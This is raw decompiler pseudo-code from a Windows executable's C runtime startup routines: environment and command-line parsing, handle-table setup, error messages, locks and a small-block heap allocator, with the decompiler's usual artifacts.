 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L0040B68F()
{
	/* unknown */ void  ebx;



    ebx = 0;
    (save)esi;
    (save)edi;
    if(*L0041AEE8 == 0) {
        L0040D034();
    }
    esi = *L0041A828;
    for(edi = 0; 1; esi = esi + L0040A210(esi) + 1) {
        al = *esi;
        if(al == bl) {
            break;
        }
        if(al != 61) {
            edi = edi + 1;
        }
    }
    esi = L0040AFD6(edi * 4 + 4);
    *L0041A854 = esi;
    if(esi == ebx) {
        L0040AF8D(9);
    }
    edi = *L0041A828;
    if(*edi != bl) {
        (save)ebp;
        do {
            ebp = L0040A210(edi) + 1;
            if(*edi != 61) {
                eax = L0040AFD6(ebp);
                *esi = eax;
                if(eax == ebx) {
                    L0040AF8D(9);
                }
                (save)edi;
                L0040A0F0( *esi);
                esi = esi + 4;
                (restore)ecx;
            }
            edi = edi + ebp;
        } while(*edi != bl);
        (restore)ebp;
    }
    *L0041A828 = ebx;
    *esi = ebx;
    (restore)edi;
    (restore)esi;
    *L0041AEE4 = 1;
    return(L0040B062( *L0041A828));
}

/*	Procedure: 0x0040B748 - 0x0040B7E0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B748()
{



    (save)ecx;
    (save)ecx;
    (save)ebx;
    ebx = 0;
    (save)esi;
    (save)edi;
    if(*L0041AEE8 == 0) {
        L0040D034();
    }
    esi = 4302968;
    (save)260;
    (save)4302968;
    (save)ebx;
    *__imp__GetModuleFileNameA();
    eax = *L0041AEF8;
    *L0041A864 = esi;
    edi = esi;
    if(*eax != bl) {
        edi = eax;
    }
    (save)ebp - 8;
    (save)ebp - 4;
    (save)ebx;
    (save)ebx;
    (save)edi;
    L0040B7E1();
    eax = *(ebp - 8);
    esi = L0040AFD6(eax + *(ebp - 4) * 4);
    if(esi == ebx) {
        L0040AF8D(8);
    }
    L0040B7E1(edi, esi, esi + *(ebp - 4) * 4, ebp - 4, ebp - 8);
    eax = *(ebp - 4) - 1;
    *L0041A84C = esi;
    (restore)edi;
    (restore)esi;
    *L0041A848 = eax;
    (restore)ebx;
}

/*	Procedure: 0x0040B7E1 - 0x0040B994
 *	Argument size: 20
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B7E1(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{



    ecx = A18;
    (save)ebx;
    (save)esi;
    *ecx = 0;
    esi = A10;
    (save)edi;
    edi = Ac;
    *A14 = 1;
    A14 = A8;
    if(edi != 0) {
        *edi = esi;
        edi = edi + 4;
        Ac = edi;
    }
    if(*A14 == 34) {
        while(1) {
            dl = *(A14 + 1);
            A14 = A14 + 1;
            if(dl == 34 || dl == 0) {
                break;
            }
            if(!( *((dl & 255) + 4304033) & 4)) {
                *ecx = *ecx + 1;
                if(esi != 0) {
                    *esi = *A14;
                    esi = esi + 1;
                    A14 = A14 + 1;
                }
            }
            *ecx = *ecx + 1;
            if(esi == 0) {
                continue;
            }
            *esi = *A14;
            esi = esi + 1;
        }
        *ecx = *ecx + 1;
        if(esi != 0) {
            *esi = 0;
            esi = esi + 1;
        }
        if(*A14 == 34) {
            A14 = A14 + 1;
        }
    } else {
        do {
            *ecx = *ecx + 1;
            if(esi != 0) {
                *esi = *A14;
                esi = esi + 1;
            }
            dl = *A14;
            A14 = A14 + 1;
            if(!( *((dl & 255) + 4304033) & 4)) {
                *ecx = *ecx + 1;
                if(esi != 0) {
                    bl = *A14;
                    *esi = bl;
                    esi = esi + 1;
                }
                A14 = A14 + 1;
            }
            if(dl == 32) {
                break;
            }
            if(dl == 0) {
                goto L0040b88c;
            }
        } while(dl != 9);
        if(dl == 0) {
L0040b88c:
            A14 = A14 - 1;
        } else {
            if(esi != 0) {
                *(esi - 1) = 0;
            }
        }
    }
    for(A18 = 0; *A14 != 0; *ecx = *ecx + 1) {
        while(1) {
            dl = *A14;
            if(dl != 32 && dl != 9) {
                break;
            }
            A14 = A14 + 1;
        }
        if(*A14 == 0) {
            break;
        }
        if(edi != 0) {
            *edi = esi;
            edi = edi + 4;
            Ac = edi;
        }
        for(*A14 = *A14 + 1; 1; A14 = A14 + 1) {
            A8 = 1;
            for(ebx = 0; *A14 == 92; ebx = ebx + 1) {
                A14 = A14 + 1;
            }
            if(*A14 == 34) {
                if(!(bl & 1)) {
                    edi = 0;
                    if(A18 != 0) {
                        *(A14 + 1) :: 34;
                        if(!(edx = A14 + 1)) {
                            goto L0040b8f9;
                        }
                    }
                    A8 = edi;
                    goto L0040b900;
L0040b8f9:
                    A14 = edx;
L0040b900:
                    edi = Ac;
                    A18 = 0 & 255;
                }
                ebx = ebx >> 1;
            }
            edx = ebx;
            ebx = ebx - 1;
            if(edx != 0) {
                ebx = ebx + 1;
                do {
                    if(esi != 0) {
                        *esi = 92;
                        esi = esi + 1;
                    }
                    *ecx = *ecx + 1;
                } while(ebx = ebx - 1);
            }
            dl = *A14;
            if(dl == 0 || A18 == 0 && (dl == 32 || dl == 9)) {
                break;
            }
            if(A8 != 0) {
                if(esi == 0) {
                    if(!( *((dl & 255) + 4304033) & 4)) {
                        A14 = A14 + 1;
                        *ecx = *ecx + 1;
                    }
                } else {
                    if(!( *((dl & 255) + 4304033) & 4)) {
                        *esi = dl;
                        esi = esi + 1;
                        A14 = A14 + 1;
                        *ecx = *ecx + 1;
                    }
                    *esi = *A14;
                    esi = esi + 1;
                }
                *ecx = *ecx + 1;
            }
        }
        if(esi != 0) {
            *esi = 0;
            esi = esi + 1;
        }
    }
    if(edi != 0) {
        *edi = 0;
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    *A14 = *A14 + 1;
}

stack space not deallocated on return
/*	Procedure: 0x0040B995 - 0x0040BAC6
 *	Argument size: 40
 *	Local size: 0
 *	Save regs size: 8
 */

L0040B995(A18, A2c, A3c)
/* unknown */ void  A18;
/* unknown */ void  A2c;
/* unknown */ void  A3c;
{
	/* unknown */ void  ecx;
	/* unknown */ void  ecx;



    eax = *L0041A97C;
    (save)A18;
    (save)ebp;
    ebp = __imp__GetEnvironmentStringsW;
    (save)esi;
    (save)edi;
    A18 = 0;
    esi = 0;
    edi = 0;
    if(eax == 0) {
        esi = *__imp__GetEnvironmentStringsW();
        if(esi != A18) {
            *L0041A97C = 1;
            goto L0040b9ec;
        }
        edi = *__imp__GetEnvironmentStrings();
        if(edi == A18) {
            goto L0040babe;
        }
        *L0041A97C = 2;
    } else {
        if(eax == 1) {
L0040b9ec:
            if(esi == A18) {
                esi = *ebp();
                if(esi == A18) {
                    goto L0040babe;
                }
            }
            eax = esi;
            if(*esi != bx) {
L0040ba03:
                do {
                    eax = eax + 1 + 1;
                    if(*eax != bx) {
                        goto L0040ba03;
                    }
                    eax = eax + 1 + 1;
                } while(*eax != bx);
            }
            eax = eax - esi;
            edi = __imp__WideCharToMultiByte;
            (save)A18;
            (save)A18;
            eax = (eax >> 1) + 1;
            (save)A18;
            (save)A18;
            (save)eax;
            (save)esi;
            (save)A18;
            (save)A18;
            A3c = eax;
            ebp = *__imp__WideCharToMultiByte();
            if(ebp != A18) {
                eax = L0040AFD6(ebp);
                A18 = eax;
                if(eax != A18) {
                    (save)A18;
                    (save)A18;
                    (save)ebp;
                    (save)eax;
                    (save)A2c;
                    (save)esi;
                    (save)A18;
                    (save)A18;
                    if(*edi() == 0) {
                        L0040B062(A18);
                        A18 = A18;
                    }
                }
            }
            (save)esi;
            *__imp__FreeEnvironmentStringsW();
            eax = A18;
            goto L0040bac0;
        }
        if(eax != 2) {
            goto L0040babe;
        }
    }
    if(edi == A18) {
        edi = *__imp__GetEnvironmentStrings();
        if(edi == A18) {
            goto L0040babe;
        }
    }
    eax = edi;
    if(*edi != bl) {
L0040ba88:
        do {
            eax = eax + 1;
            if(*eax != bl) {
                goto L0040ba88;
            }
            eax = eax + 1;
        } while(*eax != bl);
    }
    ebp = eax - edi + 1;
    esi = L0040AFD6(ebp);
    if(esi == A18) {
        esi = 0;
    } else {
        L0040A760(esi, edi, ebp);
    }
    *__imp__FreeEnvironmentStringsA(edi);
    eax = esi;
    goto L0040bac0;
L0040babe:
    eax = 0;
L0040bac0:
    (restore)edi;
    (restore)esi;
    (restore)ebp;
    (restore)A18;
}

/*	Procedure: 0x0040BAC7 - 0x0040BC82
 *	Argument size: 0
 *	Local size: 72
 *	Save regs size: 12
 */

L0040BAC7()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffffc;



    esi = L0040AFD6(1152);
    if(esi == 0) {
        L0040AF8D(27);
    }
    *L0041ADE0 = esi;
    *L0041AEE0 = 32;
    for(eax = esi + 1152; esi < eax; eax = *L0041ADE0 + 1152) {
        *(esi + 4) = 0;
        *esi = *esi | -1;
        *(esi + 8) = 0;
        *(esi + 5) = 10;
        esi = esi + 36;
    }
    (save) & Vffffffb8;
    *__imp__GetStartupInfoA();
    if(Vffffffea != 0) {
        eax = Vffffffec;
        if(eax != 0) {
            edi = *eax;
            ebx = eax + 4;
            Vfffffffc = ebx + edi;
            eax = 2048;
            if(edi >= 2048) {
                edi = 2048;
            }
            if(*L0041AEE0 < edi) {
                esi = 4304356;
                do {
                    eax = L0040AFD6(1152);
                    if(eax == 0) {
                        goto L0040bbaf;
                    }
                    *L0041AEE0 = *L0041AEE0 + 32;
                    *esi = eax;
                    for(ecx = eax + 1152; eax < ecx; ecx = ecx + 1152) {
                        *(eax + 4) = 0;
                        *eax = *eax | -1;
                        *(eax + 8) = 0;
                        *(eax + 5) = 10;
                        ecx = *esi;
                        eax = eax + 36;
                    }
                    esi = esi + 4;
                } while(*L0041AEE0 < edi);
                goto L0040bbb5;
L0040bbaf:
                edi = *L0041AEE0;
            }
L0040bbb5:
            esi = 0;
            if(edi > 0) {
                do {
                    ecx = *Vfffffffc;
                    if(ecx != -1) {
                        al = *ebx;
                        if(!(al & 1)) {
                            if(al & 8) {
                                goto L0040bbda;
                            }
                            (save)ecx;
                            if(*__imp__GetFileType() != 0) {
L0040bbda:
                                ecx = esi;
                                eax = esi;
                                ecx = ecx >> 5;
                                eax = eax & 31;
                                ecx = *(ecx * 4 + 4304352);
                                eax = ecx + (eax + eax * 8) * 4;
                                *eax = *Vfffffffc;
                                *(eax + 4) = *ebx;
                            }
                        }
                    }
                    Vfffffffc = Vfffffffc + 4;
                    esi = esi + 1;
                    ebx = ebx + 1;
                } while(esi < edi);
            }
        }
    }
    ebx = 0;
    do {
        ecx = *L0041ADE0;
        eax = ebx + ebx * 8;
        *(ecx + eax * 4) :: -1;
        if(esi = ecx + eax * 4) {
            *(esi + 4) = *(esi + 4) | 128;
        } else {
            *(esi + 4) = 129;
            if(ebx != 0) {
                eax = ~(ebx - 1);
                asm("sbb eax,eax");
                eax = eax + -11;
            } else {
                eax = -10;
            }
            (save)eax;
            edi = *__imp__GetStdHandle();
            if(edi == -1) {
                goto L0040bc57;
            }
            (save)edi;
            eax = *__imp__GetFileType();
            if(eax == 0) {
                goto L0040bc57;
            }
            eax = eax & 255;
            *esi = edi;
            if(eax == 2) {
                goto L0040bc57;
            }
            if(eax == 3) {
                *(esi + 4) = *(esi + 4) | 8;
                goto L0040bc6c;
L0040bc57:
                *(esi + 4) = *(esi + 4) | 64;
            }
        }
L0040bc6c:
        ebx = ebx + 1;
    } while(ebx < 3);
    return(*__imp__SetHandleCount( *L0041AEE0));
}

stack space not deallocated on return
/*	Procedure: 0x0040BC83 - 0x0040BCBE
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040BC83(A8)
/* unknown */ void  A8;
{



    (save)0;
    (save)4096;
    0 = 0;
    (save)0;
    eax = *__imp__HeapCreate();
    *L0041ADC0 = eax;
    if(eax != 0) {
        if(L0040BF05() != 0) {
            goto L0040bcbb;
        }
        *__imp__HeapDestroy( *L0041ADC0);
    }
    return(0);
L0040bcbb:
    return(1);
}

/* DEST BLOCK NOT FOUND: 0040bccb -> 0040bcf7 */
/* DEST BLOCK NOT FOUND: 0040bcd4 -> 0040bcf7 */
/*	Procedure: 0x0040BCBF - 0x0040BCF7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040BCBF()
{



    eax = *L0041A830;
    if(eax == 1 || eax == 0 && *L004124A4 == 1) {
        L0040BCF8(252);
        eax = *L0041A980;
        if(eax != 0) {
            *eax();
        }
        eax = L0040BCF8(255);
    }
}

/*	Procedure: 0x0040BCF8 - 0x0040BE4A
 *	Argument size: -416
 *	Local size: 420
 *	Save regs size: 0
 */

L0040BCF8(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffe5c;
	/* unknown */ void  Vffffff60;



    edx = A8;
    ecx = 0;
    eax = 0x412778;
    do {
        if(edx == *eax) {
            break;
        }
        eax = eax + 8;
        ecx = ecx + 1;
    } while(eax < 0x412808);
    (save)esi;
    esi = ecx << 3;
    if(edx == *(esi + 0x412778)) {
        eax = *L0041A830;
        if(eax == 1 || eax == 0 && *L004124A4 == 1) {
            goto L0040be22;
        }
        if(edx != 252) {
            (save)260;
            (save) & Vfffffe5c;
            (save)0;
            if(*__imp__GetModuleFileNameA() == 0) {
                (save)4253920;
                L0040A0F0( & Vfffffe5c);
            }
            (save)edi;
            edi = & Vfffffe5c;
            if(L0040A210( & Vfffffe5c) + 1 > 60) {
                edi = L0040A210( & Vfffffe5c) + & Vfffffe5c - 59;
                L0040A460(edi, 4253916, 3);
            }
            (save)4253888;
            L0040A0F0( & Vffffff60);
            L0040A100( & Vffffff60, edi);
            L0040A100( & Vffffff60, 4253884);
            L0040A100( & Vffffff60, *(esi + 0x41277c));
            (save)73744;
            (save)4253844;
            (save) & Vffffff60;
            eax = L0040D050();
            esp = esp + 44;
            (restore)edi;
            goto L0040be48;
L0040be22:
            esi = esi + 0x41277c;
            eax = *__imp__WriteFile( *__imp__GetStdHandle(), -12, *esi, L0040A210( *esi), & A8, 0);
        }
    }
L0040be48:
    (restore)esi;
}

/*	Procedure: 0x0040BE4B - 0x0040BE65
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040BE4B(A4)
/* unknown */ void  A4;
{



    eax = *L0041A988;
    if(eax != 0 && *eax(A4) != 0) {
        return(1);
    }
    return(0);
}

stack space not deallocated on return
/*	Procedure: 0x0040BE66 - 0x0040BE8E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L0040BE66()
{
	/* unknown */ void  esi;



    *__imp__InitializeCriticalSection();
    *__imp__InitializeCriticalSection();
    *__imp__InitializeCriticalSection();
    return(*__imp__InitializeCriticalSection( *L0041280C, *L0041282C, *L0041283C, *L0041284C));
}

/*	Procedure: 0x0040BE8F - 0x0040BEEF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040BE8F(A8)
/* unknown */ void  A8;
{



    eax = A8;
    (save)esi;
    *(eax * 4 + 0x412808) :: 0;
    if(!(esi = eax * 4 + 0x412808)) {
        (save)edi;
        edi = L0040AFD6(24);
        if(edi == 0) {
            L0040AF8D(17);
        }
        L0040BE8F(17);
        (save)edi;
        if(*esi == 0) {
            *__imp__InitializeCriticalSection();
            *esi = edi;
        } else {
            L0040B062();
            (restore)ecx;
        }
        L0040BEF0(17);
        (restore)edi;
    }
    eax = *__imp__EnterCriticalSection( *esi);
    (restore)esi;
}

/*	Procedure: 0x0040BEF0 - 0x0040BF04
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040BEF0(A8)
/* unknown */ void  A8;
{



    return(*__imp__LeaveCriticalSection( *(A8 * 4 + 0x412808)));
}

stack space not deallocated on return
/*	Procedure: 0x0040BF05 - 0x0040BF42
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040BF05()
{



    eax = *__imp__HeapAlloc( *L0041ADC0, 0, 320);
    *L0041ADBC = eax;
    if(eax == 0) {
        return;
    }
    *L0041ADB4 = 0;
    *L0041ADB8 = 0;
    (save)1;
    *L0041ADB0 = eax;
    *L0041ADA8 = 16;
    (restore)eax;
}

/* DEST BLOCK NOT FOUND: 0040bf64 -> 0040bf6d */
/*	Procedure: 0x0040BF43 - 0x0040BF6D
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040BF43(A4)
/* unknown */ void  A4;
{



    eax = *L0041ADBC;
    for(ecx = eax + ( *L0041ADB8 + *L0041ADB8 * 4) * 4; eax < ecx; eax = eax + 20) {
        if(A4 - *(eax + 12) < 1048576) {
            goto L0040bf6d;
        }
    }
    eax = 0;
L0040bf6d:
}

/*	Procedure: 0x0040BF6E - 0x0040C298
 *	Argument size: -9
 *	Local size: 20
 *	Save regs size: 0
 */

L0040BF6E(A8, Ac, Af)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  Af;
{
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edx = Ac;
    ecx = A8;
    (save)ebx;
    (save)esi;
    eax = *(ecx + 16);
    esi = edx - *(ecx + 12);
    ebx = *(edx - 4);
    edx = edx + -4;
    (save)edi;
    esi = esi >> 15;
    ecx = esi;
    edi = *(edx - 4);
    516 = ecx * ecx;
    ebx = ebx - 1;
    Vfffffffc = edi;
    Vfffffff4 = ebx;
    Vfffffff0 = ecx + eax + 324;
    ecx = *(ebx + edx);
    Vfffffff8 = ecx;
    if(!(cl & 1)) {
        (save)63;
        ecx = (ecx >> 4) - 1;
        (restore)edi;
        Ac = ecx;
        if(ecx > edi) {
            Ac = edi;
        }
        if(*(ebx + edx + 4) == *(ebx + edx + 8)) {
            ecx = Ac;
            if(ecx >= 32) {
                goto L0040bff4;
            }
            edi = -2147483648 >> cl;
            ecx = ecx + eax + 4;
            edi = !edi;
            *(eax + esi * 4 + 68) = *(eax + esi * 4 + 68) & edi;
            if(!( *ecx = *ecx - 1)) {
                *A8 = *A8 & edi;
                goto L0040c018;
L0040bff4:
                ecx = ecx + -32;
                edi = -2147483648 >> cl;
                ecx = Ac + eax + 4;
                edi = !edi;
                *(eax + esi * 4 + 196) = *(eax + esi * 4 + 196) & edi;
                if(!( *ecx = *ecx - 1)) {
                    *(A8 + 4) = *(A8 + 4) & edi;
                }
            }
        }
L0040c018:
        ecx = *(ebx + edx + 8);
        *(ecx + 4) = *(ebx + edx + 4);
        ecx = *(ebx + edx + 4);
        edi = *(ebx + edx + 8);
        ebx = ebx + Vfffffff8;
        *(ecx + 8) = edi;
        Vfffffff4 = ebx;
    }
    edi = (ebx >> 4) - 1;
    if(edi > 63) {
        edi = 63;
    }
    if(!(Vffffffec = Vfffffffc & 1)) {
        edx = edx - Vfffffffc;
        (save)63;
        Vfffffff8 = edx;
        ecx = (Vfffffffc >> 4) - 1;
        (restore)edx;
        Ac = ecx;
        if(ecx > edx) {
            Ac = edx;
            ecx = edx;
        }
        ebx = ebx + Vfffffffc;
        Vfffffff4 = ebx;
        edi = (ebx >> 4) - 1;
        if(edi > edx) {
            edi = edx;
        }
        if(ecx != edi) {
            ecx = Vfffffff8;
            if(*(ecx + 4) == *(ecx + 8)) {
                ecx = Ac;
                if(ecx >= 32) {
                    goto L0040c0b2;
                }
                edx = -2147483648 >> cl;
                ecx = ecx + eax + 4;
                edx = !edx;
                *(eax + esi * 4 + 68) = *(eax + esi * 4 + 68) & edx;
                if(!( *ecx = *ecx - 1)) {
                    *A8 = *A8 & edx;
                    goto L0040c0d6;
L0040c0b2:
                    ecx = ecx + -32;
                    edx = -2147483648 >> cl;
                    ecx = Ac + eax + 4;
                    edx = !edx;
                    *(eax + esi * 4 + 196) = *(eax + esi * 4 + 196) & edx;
                    if(!( *ecx = *ecx - 1)) {
                        *(A8 + 4) = *(A8 + 4) & edx;
                    }
                }
            }
L0040c0d6:
            ecx = Vfffffff8;
            edx = *(ecx + 8);
            *(edx + 4) = *(ecx + 4);
            ecx = Vfffffff8;
            edx = *(ecx + 4);
            *(edx + 8) = *(ecx + 8);
        }
        edx = Vfffffff8;
    }
    if(Vffffffec != 0 || Ac != edi) {
        *(edx + 4) = *(Vfffffff0 + edi * 8 + 4);
        ecx = Vfffffff0 + edi * 8;
        *(edx + 8) = ecx;
        *( *(edx + 8) + 4) = edx;
        *( *(edx + 4) + 8) = edx;
        if(*(edx + 4) == *(edx + 8)) {
            cl = *(edi + eax + 4);
            edi :: 32;
            Af = cl;
            *(edi + eax + 4) = cl;
            if(!(cl = Af + 1)) {
                if(Af == 0) {
                    ecx = edi;
                    ebx = -2147483648 >> cl;
                    *A8 = *A8 | ebx;
                }
                ebx = -2147483648 >> edi;
                *(eax + esi * 4 + 68) = *(eax + esi * 4 + 68) | ebx;
            } else {
                if(Af == 0) {
                    ecx = edi - 32;
                    ebx = -2147483648 >> cl;
                    *(A8 + 4) = *(A8 + 4) | ebx;
                }
                ecx = edi - 32;
                edi = -2147483648 >> cl;
                *(eax + esi * 4 + 196) = *(eax + esi * 4 + 196) | edi;
            }
            ebx = Vfffffff4;
        }
    }
    eax = Vfffffff0;
    *edx = ebx;
    *(ebx + edx - 4) = ebx;
    if(!( *eax = *eax - 1)) {
        eax = *L0041ADB4;
        if(eax != 0) {
            edi = __imp__VirtualFree;
            ecx = ( *L0041ADAC << 15) + *(eax + 12);
            ebx = 32768;
            (save)16384;
            (save)32768;
            (save)ecx;
            *__imp__VirtualFree();
            *( *L0041ADB4 + 8) = *( *L0041ADB4 + 8) | -2147483648 >> *L0041ADAC;
            *( *( *L0041ADB4 + 16) + *L0041ADAC * 4 + 196) = 0;
            *( *( *L0041ADB4 + 16) + 67) = *( *( *L0041ADB4 + 16) + 67) - 1;
            eax = *L0041ADB4;
            if(*( *(eax + 16) + 67) == 0) {
                *(eax + 4) = *(eax + 4) & -2;
                eax = *L0041ADB4;
            }
            if(*(eax + 8) != -1) {
                goto L0040c286;
            }
            (save)ebx;
            (save)0;
            (save) *(eax + 12);
            *edi();
            (save) *( *L0041ADB4 + 16);
            (save)0;
            (save) *L0041ADC0;
            *__imp__HeapFree();
            eax = *L0041ADB4;
            L0040D0E0(eax, eax + 20, ( *L0041ADB8 + *L0041ADB8 * 4 << 2) - eax + *L0041ADBC - 20);
            eax = A8;
            *L0041ADB8 = *L0041ADB8 - 1;
            if(eax > *L0041ADB4) {
                eax = eax - 20;
            }
            *L0041ADB0 = *L0041ADBC;
        } else {
L0040c286:
            eax = A8;
        }
        *L0041ADB4 = eax;
        *L0041ADAC = esi;
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
}

/*	Procedure: 0x0040C299 - 0x0040C5A1
 *	Argument size: -13
 *	Local size: 20
 *	Save regs size: 0
 */

L0040C299(A8, Ab)
/* unknown */ void  A8;
/* unknown */ void  Ab;
{
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edx = *L0041ADBC;
    (save)ebx;
    (save)esi;
    (save)edi;
    edi = edx + ( *L0041ADB8 + *L0041ADB8 * 4) * 4;
    eax = A8;
    Vfffffffc = edi;
    ecx = eax + 23 & -16;
    Vfffffff0 = ecx;
    ecx = (Vfffffff0 >> 4) - 1;
    if(ecx < 32) {
        esi = (esi | -1) >> cl;
        Vfffffff8 = Vfffffff8 | -1;
        Vfffffff4 = esi;
    } else {
        ecx = ecx + -32;
        eax = eax | -1;
        esi = 0;
        Vfffffff4 = 0;
        Vfffffff8 = eax >> cl;
    }
    eax = *L0041ADB0;
    ebx = eax;
    A8 = ebx;
    if(ebx < edi) {
        do {
            ecx = *(ebx + 4);
            edi = *ebx;
            ecx = ecx & Vfffffff8;
            if(ecx = ecx | edi & esi) {
                break;
            }
            ebx = ebx + 20;
            A8 = ebx;
        } while(ebx < Vfffffffc);
    }
    if(ebx == Vfffffffc) {
        for(ebx = edx; 1; ebx = ebx + 20) {
            A8 = ebx;
            if(ebx >= eax) {
                break;
            }
            ecx = *(ebx + 4);
            edi = *ebx;
            ecx = ecx & Vfffffff8;
            if(ecx = ecx | edi & esi) {
                break;
            }
        }
        if(ebx != eax) {
            goto L0040c38e;
        }
        while(ebx < Vfffffffc && *(ebx + 8) == 0) {
            ebx = ebx + 20;
            A8 = ebx;
        }
        if(ebx == Vfffffffc) {
            for(ebx = edx; 1; ebx = ebx + 20) {
                A8 = ebx;
                if(ebx >= eax || *(ebx + 8) != 0) {
                    break;
                }
            }
            if(ebx == eax) {
                ebx = L0040C5A2();
                A8 = ebx;
                if(ebx == 0) {
                    goto L0040c387;
                }
            }
        }
        eax = L0040C653(ebx);
        *( *(ebx + 16)) = eax;
        if(*( *(ebx + 16)) != -1) {
            goto L0040c38e;
        }
L0040c387:
        eax = 0;
    } else {
L0040c38e:
        *L0041ADB0 = ebx;
        eax = *(ebx + 16);
        edx = *eax;
        Vfffffffc = edx;
        if(edx != -1) {
            ecx = *(eax + edx * 4 + 196);
            edi = *(eax + edx * 4 + 68);
            ecx = ecx & Vfffffff8;
            if(ecx = ecx | edi & esi) {
                goto L0040c3ec;
            }
        }
        edx = *(eax + 196);
        esi = *(eax + 68);
        edx = edx & Vfffffff8;
        esi = esi & Vfffffff4;
        Vfffffffc = 0;
        ecx = eax + 68;
        esi = Vfffffff4;
        if(!(edx = edx | esi)) {
            do {
                Vfffffffc = Vfffffffc + 1;
                edx = *(ecx + 132) & Vfffffff8;
                ecx = ecx + 4;
            } while(edx = edx | esi & *ecx);
        }
        edx = Vfffffffc;
L0040c3ec:
        ecx = edx;
        edi = 0;
        516 = ecx * ecx;
        Vfffffff4 = ecx + eax + 324;
        if(!(ecx = *(eax + edx * 4 + 68) & esi)) {
            (save)32;
            ecx = *(eax + edx * 4 + 196) & Vfffffff8;
            (restore)edi;
        }
        while(ecx >= 0) {
            ecx = ecx << 1;
            edi = edi + 1;
        }
        edx = *(Vfffffff4 + edi * 8 + 4);
        ecx = *edx - Vfffffff0;
        Vfffffff8 = ecx;
        esi = (ecx >> 4) - 1;
        if(esi > 63) {
            esi = 63;
        }
        if(esi != edi) {
            if(*(edx + 4) == *(edx + 8)) {
                if(edi < 32) {
                    ebx = -2147483648 >> edi;
                    ecx = Vfffffffc;
                    edi = eax + edi + 4;
                    ebx = !ebx;
                    Vffffffec = ebx;
                    *(eax + ecx * 4 + 68) = Vffffffec & *(eax + ecx * 4 + 68);
                    if(*edi = *edi - 1) {
                        goto L0040c4a9;
                    }
                    ebx = A8;
                    *ebx = *ebx & Vffffffec;
                } else {
                    ecx = edi - 32;
                    ebx = -2147483648 >> cl;
                    edi = eax + edi + 4;
                    ecx = eax + Vfffffffc * 4 + 196;
                    ebx = !ebx;
                    *ecx = *ecx & ebx;
                    Vffffffec = ebx;
                    if(!( *edi = *edi - 1)) {
                        ebx = A8;
                        *(ebx + 4) = *(ebx + 4) & Vffffffec;
                    } else {
L0040c4a9:
                        ebx = A8;
                    }
                }
            }
            ecx = *(edx + 8);
            *(ecx + 4) = *(edx + 4);
            ecx = *(edx + 4);
            *(ecx + 8) = *(edx + 8);
            if(Vfffffff8 == 0) {
                goto L0040c55c;
            }
            ecx = Vfffffff4;
            edi = *(ecx + esi * 8 + 4);
            ecx = ecx + esi * 8;
            *(edx + 4) = edi;
            *(edx + 8) = ecx;
            *( *(edx + 8) + 4) = edx;
            *( *(edx + 4) + 8) = edx;
            if(*(edx + 4) == *(edx + 8)) {
                cl = *(esi + eax + 4);
                Ab = cl;
                if(esi < 32) {
                    cl = cl + 1;
                    *(esi + eax + 4) = cl;
                    if(Ab == 0) {
                        ecx = esi;
                        *ebx = *ebx | -2147483648 >> cl;
                    }
                    edi = -2147483648 >> esi;
                    *(eax + Vfffffffc * 4 + 68) = *(eax + Vfffffffc * 4 + 68) | edi;
                } else {
                    cl = cl + 1;
                    *(esi + eax + 4) = cl;
                    if(Ab == 0) {
                        ecx = esi - 32;
                        *(ebx + 4) = *(ebx + 4) | -2147483648 >> cl;
                    }
                    edi = eax + Vfffffffc * 4 + 196;
                    ecx = esi - 32;
                    *edi = *edi | -2147483648 >> cl;
                }
            }
            ecx = Vfffffff8;
        }
        if(ecx != 0) {
            *edx = ecx;
            *(ecx + edx - 4) = ecx;
            goto L0040c55f;
L0040c55c:
            ecx = Vfffffff8;
        }
L0040c55f:
        esi = Vfffffff0;
        edx = edx + ecx;
        ecx = esi + 1;
        *edx = ecx;
        *(edx + esi - 4) = *edx;
        esi = Vfffffff4;
        ecx = *esi;
        ecx :: 0;
        if(!( *esi = ecx + 1) && ebx == *L0041ADB4 && Vfffffffc == *L0041ADAC) {
            *L0041ADB4 = 0;
        }
        *eax = Vfffffffc;
        eax = edx + 4;
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
}

stack space not deallocated on return
/*	Procedure: 0x0040C5A2 - 0x0040C652
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040C5A2()
{



    eax = *L0041ADB8;
    ecx = *L0041ADA8;
    (save)esi;
    (save)edi;
    edi = 0;
    if(eax == ecx) {
        (save)ecx + ecx * 4 + 80 << 2;
        (save) *L0041ADBC;
        (save)0;
        (save) *L0041ADC0;
        eax = *__imp__HeapReAlloc();
        if(eax == edi) {
            goto L0040c635;
        }
        *L0041ADA8 = *L0041ADA8 + 16;
        *L0041ADBC = eax;
        eax = *L0041ADB8;
    }
    (save)16836;
    (save)8;
    (save) *L0041ADC0;
    esi = *L0041ADBC + (eax + eax * 4) * 4;
